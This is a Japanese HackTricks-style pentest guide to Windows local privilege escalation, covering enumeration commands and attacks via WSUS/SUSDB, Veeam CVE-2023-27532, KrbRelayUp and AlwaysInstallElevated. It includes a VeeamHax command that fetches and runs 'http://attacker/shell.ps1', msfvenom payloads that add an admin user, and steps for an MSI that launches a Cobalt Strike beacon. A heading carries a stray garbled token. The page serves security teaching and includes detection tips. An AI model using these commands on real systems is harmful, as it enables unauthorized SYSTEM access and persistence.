# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、複数の基礎的なガイドにある Windows 権限昇格の一般的な手法をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙の流れは、コミュニティのワークショップやチェックリストも参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法に関する資料には、Windows 権限昇格を扱った DerbyCon のプレゼンテーションも含まれています。<sup>[[5]](#references)</sup>

## Windows の基礎理論

### Access Tokens

**Windows の access token について知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 整合性レベル

**Windows の整合性レベルについて知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙**や実行ファイルの起動を**妨げたり**、さらには**活動を検知したり**するものがいくつかあります。権限昇格の列挙を始める前に、以下の**ページを読み**、これらの**防御メカニズム**をすべて**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインの UEFI NVRAM 編集を、起動前 DMA と Windows の `SYSTEM` メモリパッチ適用チェーンに発展させることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess によるサイレント昇格

`RAiLaunchAdminProcess` 経由で起動された UIAccess プロセスは、AppInfo のセキュアパスチェックを回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection 回避手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播を悪用すると、任意の SYSTEM レジストリ書き込みが可能になります (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM 認証を再利用された SMB TCP 接続経由でリフレクトする、**SMB 任意ポート**を利用した LPE 手法も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性があるか確認してください (適用済みのパッチも確認してください)。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン別 Exploits

Microsoft のセキュリティ脆弱性に関する詳細情報を検索するには、この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)が便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows 環境が**巨大な攻撃対象領域**を持つことが分かります。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS のビルド、インストール済み更新プログラム、該当する可能性のあるアドバイザリ候補を一覧表示します。結果が適用可能と判断する前に、正確な製品と後続の更新プログラムを確認してください。

バージョン固有のローカル Exploit を調べる際は、OS のアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64-bit Windows では、32-bit プロセスは[WOW64 のファイル システム リダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)の対象になります。通常、`%windir%\System32` は32-bit のシステム ディレクトリに解決されますが、`%windir%\Sysnative` を使うと、そのプロセスからネイティブのシステム ディレクトリにアクセスできます。このエイリアスは64-bit プロセスでは利用できません。OS のビルドや KB の欠落候補だけでは、Exploit が可能だとは証明できません。実行中のビルド、インストール済みまたは後続の更新プログラム、プロセスのアーキテクチャ、Exploit の前提条件を、該当する問題の[Microsoft セキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照らし合わせてください。

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit の Github リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

認証情報や Juicy な情報が環境変数に保存されていませんか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcriptファイル

これを有効にする方法は、[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに書き込みますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルをリダイレクトできます。transcript を確認する前に、実際の出力先とファイルの ACL を確認してください。コマンドの引数や出力（認証情報を含む場合があります）が記録されている可能性があります。読み取り可能な transcript は、その内容から利用可能な高い権限を持つ ID が判明し、かつその ID で該当するコンテキストにログオンできる場合に限り、手掛かりになります。

### PowerShell Module Logging

PowerShell の pipeline 実行の詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**"Powershell Transcription"** ではなく **"Module Logging"** を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell のログから直近 15 件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行アクティビティとその全内容を記録し、コードの各ブロックが実行時に記録されるようにします。この処理により、各アクティビティの包括的な監査証跡が保持され、フォレンジック調査や悪意のある挙動の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な分析情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows Event Viewer の次の場所で確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近の 20 件のイベントを表示するには、次のコマンドを使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP の WSUS endpoint は、更新 metadata の傍受を調査する手がかりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者がその通信を傍受または制御できるか、そしてクライアントの更新に関する信頼設定とインストールポリシーにも左右されます。URL だけではコード実行が可能だとは判断できません。[Microsoft は WSUS metadata に TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、cmd で次のコマンドを実行し、ネットワークが SSL なしの WSUS 更新を使用しているか確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または PowerShell では次のようにします：

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような応答が返ってきた場合:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合。

`UseWUServer` が `1` の場合、Windows Update は設定されたイントラネットサービスを使用します。これは HTTP interception を行うための前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。値が `0` の場合、このポリシーで設定された WSUS エンドポイントは選択されません。

これらの脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非 SSL の WSUS トラフィックに「偽の」更新プログラムを注入するための、MiTM 用に weaponize された exploit スクリプトです。

研究内容はこちらをご覧ください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**レポート全文はこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
基本的に、このバグが悪用する脆弱性は次のとおりです。

> ローカルユーザーのプロキシを変更でき、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用する場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自身のトラフィックを傍受し、アセット上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名用の自己署名証明書を生成し、それを現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS トラフィックを傍受できます。WSUS には、証明書に対する trust-on-first-use 型の検証を実装する HSTS のような仕組みはありません。提示された証明書がユーザーによって信頼され、正しいホスト名を持つ場合、サービスはその証明書を受け入れます。

この脆弱性は、ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開後）を使って悪用できます。

### WSUS 管理者が制御する更新プログラム

現在の ID で WSUS サーバー上の更新プログラムを**公開および承認**できる場合は、別の攻撃経路が存在します。サーバーの `WSUS Administrators` グループへの実効的な所属状況と、委任された WSUS 権限を確認し、承認された更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoft は更新プログラムの承認に WSUS Administrator 権限を要求しており](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)、[公開における信頼関係を文書化しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使用された証明書を信頼する必要があります。これを権限昇格の経路と見なす前に、対象の更新プログラムに署名があり受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTP の `WUServer` 値やグループ名だけでは、これらの条件が満たされているとは判断できません。

### SUSDB のカスタム更新プログラム悪用：`.txt`/`.esd` 経由の未署名ペイロード

これは HTTP WSUS 接続の傍受とは異なる信頼境界の問題です。前提条件は、カスタム更新プログラムを公開および承認するための **WSUS データベース（`SUSDB`）のストアドプロシージャ**への十分なアクセス権です。実用的な侵入経路の一つは、上流 WSUS コンピューターアカウントを中継して、`SUSDB` をホストする別の MSSQL サーバーに接続する方法です。必要な前提条件はデプロイ環境によって異なるため、SQL administrator 権限があると決めつけず、まず `EXECUTE` 権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUS クライアント認証を HTTP/8530 から LDAP、SMB、または AD CS に中継する別の攻撃経路については、[NTLM relay による WSUS HTTP の悪用](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 更新プログラムの作成、対象指定、承認

カスタム更新プログラムのワークフローでは、制限された公開 API として WSUS の正規の手順を使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新プログラムのメタデータをインポート | `spImportUpdate` |
| 前提条件、ローカライズ済み XML フラグメント、拡張 XML フラグメントを保存 | `spSaveXMLFragment` |
| コンテンツダイジェストを攻撃者が制御する URL に関連付け | `spSetBatchURL` |
| コンピューターグループを列挙／作成し、クライアントを追加 | `spGetAllTargetGroups`、`spCreateTargetGroup`、`spGetComputerTargetByName`、`spAddComputerToTargetGroup` |
| そのグループに対するインストールを承認 | `@actionID = 0` および `@isAssigned = 1` を指定した `spDeployUpdate` |

ファイル名、ダイジェスト、サイズ、および `CommandLineInstallation` ハンドラーは、インポートされたメタデータ／フラグメント間で一致している必要があります。コンテンツ URL と対象グループを割り当てた後の最終的な承認処理は、次のようになります。例の GUID を再利用せず、新しい更新プログラム、グループ、デプロイメントの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による署名バイパス

WSUS は通常、署名のない任意の実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` では、.NET の `VerifyFile` パスが、指定されたファイル名の末尾が `.txt` または `.esd` の場合に証明書チェックのフラグを false に設定します。そのため、バイト列がテキストまたは正規の ESD イメージであることを事前に確認することなく、`CheckCertificateSignature` がスキップされます。したがって、たとえば `payload.exe.txt` という名前にした変更のない PE はコンテンツ検証を通過し、その後、更新プログラムのコマンドライン インストール ハンドラーによって起動される可能性があります。これは署名の偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-compatible staging と自動化

`spDeployUpdate` を呼び出すと、WSUS は登録されたコンテンツを取得します。オリジンは BITS の HTTP 要件を満たす必要があります。URL に到達できるだけでは不十分で、転送では最初に `HEAD`/`GET` のフローが実行され、バイト範囲リクエストも使用されるためです。Range に対応していないサーバーでは、BITS に Range protocol header が必要であることを示す WSUS 同期の `EventId=364` が発生します。<sup>[[39]](#references)</sup>

調査用 PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) は、import/fragment/URL/group/deployment の一連の処理に必要な SQL を生成し、その実行用に改変した MSSQL クライアントを含み、コンテンツのステージングに使う `BitsWebServer.py` も付属しています。許可されたラボでの最小限の実行方法は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 無人実行と再試行による永続化

クライアント側での動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従って、ユーザーが手動で選択しなくてもインストールされます。テストでは、更新が失敗または未完了のままだった payload は、コールバックプロセスの終了後すぐに再び提示されました。そのため、再試行の動作が繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検知とハードニングの着眼点

この手法で有用なサーバー側およびクライアント側の着眼点は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査し、新規のターゲティンググループ、外部のコンテンツ配信元、`.txt`/`.esd` の更新 payload、想定外のプリンシパル（特にコンピューターアカウント以外）によるデプロイを調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、`EventId=364` を確認します。検証ログを payload の拡張子およびコンテンツのマジックナンバーと照合し、拡張子だけを信用しないようにします。
- Windows Update のインストールが繰り返し失敗・再試行される状況、および `.txt` や `.esd` という名前のコンテンツからの PE 実行や想定外の子プロセス・ネットワークアクティビティを探します。
- 対応している場合はデータベースサービスで Extended Protection for Authentication を必須にし、データベースへのネットワークアクセスを WSUS サーバーと認可された管理システムに制限します。カスタム更新用プロシージャに対する `EXECUTE` 権限を最小化し、監査します。

## サードパーティ製自動更新ツールと Agent IPC（ローカル権限昇格）

多くのエンタープライズエージェントは、localhost の IPC インターフェースと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバーに強制でき、アップデーターが不正なルート CA や弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を送り込み、SYSTEM サービスにインストールさせることができます。一般化した手法（Netskope stAgentSvc の手法、CVE-2025-0309 に基づく）はこちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401 経由で SYSTEM）

Veeam Backup & Replication と Cloud Connect は、デフォルトで **TCP/9401** を使用するコアバックアップサービスを利用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424)では、バックアップネットワークの境界内で、暗号化された構成データベースの認証情報が認証なしで漏えいする問題が説明されています。別の公開 PoC では、**NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が示されています。<sup>[[12]](#references)</sup> サービスは localhost 以外にもバインドされる可能性があるため、実際のアドレスと PID を確認してください。

- **偵察**: TCP/9401 が `Veeam.Backup.Service.exe` に属することを確認し、インストール済みの製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手掛かりにはなりますが、完全なパッチ確認ではありません。
- **修正済みバージョンの下限**: Veeam が最初の修正済みリリースとして挙げているのは **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** です。それ以前のリリースは影響を受けます。4 要素のファイルバージョンだけでは、同じビルド番号の未パッチのベースビルドと後続パッチを区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **悪用**: 必要な Veeam DLL とともに `VeeamHax.exe` などの PoC を同じディレクトリに置き、ローカルソケット経由で SYSTEM payload を実行します。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

引用された PoC は、追加の前提条件が満たされた場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。
## KrbRelayUp

ローカル Kerberos relay は、適切な COM server が認証を行い、relay された principal が対象オブジェクトへの権限を持つ場合、低権限のログオンから特権的なディレクトリ書き込みへとつながる可能性があります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)では、RBCD と `msDS-KeyCredentialLink`（shadow credential）の LDAP 書き込みの両方が説明されており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD chain には該当する委任設定と対象オブジェクトへの権限が必要です。一方、shadow credential chain には key credential の書き込み権限と、証明書認証の経路をサポートする KDC が必要です。どちらの経路も、ドメインに参加しているだけで可能になるわけではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、relay される ID のオブジェクト ACL、選択した COM class の認証レベルと impersonation レベルを確認してください。呼び出し元のログオンの種類と認証情報のコンテキストも重要です。WinRM session は、対話型ログオンや新しい認証情報でのログオンとは異なる動作をする場合があります。Firewall/OXID routing やインストール済みの更新プログラムによっても結果が変わる可能性があります。寛容なポリシーや一致する ACL は確認候補として扱い、受動的な列挙で COM coercion、relay 認証、ディレクトリへの書き込みを発生させないでください。マシンアカウントの shadow credential からマシンチケットを取得できる場合がありますが、別途 DCSync に進むには、そのアカウントに必要なディレクトリレプリケーション権限が必要です。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)で**exploit**を確認してください。

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリキーが**有効**（値が **0x1**）になっている**場合**、どの権限のユーザーでも `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter セッションがある場合は、モジュール **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使うと、権限昇格用の Windows MSI バイナリを現在のディレクトリに作成できます。このスクリプトは、ユーザーまたはグループの追加を求めるコンパイル済み MSI インストーラーを書き出します（そのため、GIU アクセスが必要です）。

```
Write-UserAddMSI
```

作成したバイナリを実行して権限を昇格させます。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、このチュートリアルを読んでください。**コマンドライン**を**実行**するだけでよい場合は、「**.bat**」ファイルをラップすることもできます。

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit で、新しい Windows EXE TCP payload を `C:\privesc\beacon.exe` に**生成**します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- **AlwaysPrivesc** などのプロジェクト名を付け、場所に **`C:\privesc`** を指定します。**place solution and project in the same directory** を選択し、**Create** をクリックします。
- 手順 3/4（含めるファイルの選択）に進むまで **Next** をクリックします。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** などのプロパティも変更でき、インストールしたアプリをより正規のものらしく見せることができます。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーの実行直後に Beacon payload が実行されます。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**ビルド**します。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI のインストール

悪意のある `.msi` ファイルを**バックグラウンドで**インストールするには、次のコマンドを実行します。

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性を悪用するには、_exploit/windows/local/always_install_elevated_ を使用できます。

## Antivirus と検出ツール

### 監査設定

これらの設定によって何が**ログに記録されるか**が決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログの送信先を確認するとよいでしょう。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** は、ドメイン参加コンピューター上の**ローカル Administrator パスワードを管理**し、各パスワードが**一意でランダムに生成され、定期的に更新される**ように設計されています。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、認可されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードが LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1**から、MicrosoftはLocal Security Authority（LSA）に対する保護を強化し、信頼されていないプロセスによる**メモリの読み取り**やコードの注入を**阻止**して、システムのセキュリティをさらに強化しました。\
[**LSA Protectionの詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威から、デバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属するグループに、興味深い権限が設定されていないか確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、それを悪用して権限昇格する方法についてはこちらをご覧ください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**token**とは何かについては、こちらのページをご覧ください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
興味深いtokenと、それを悪用する方法については、以下のページをご覧ください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッションқәа

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

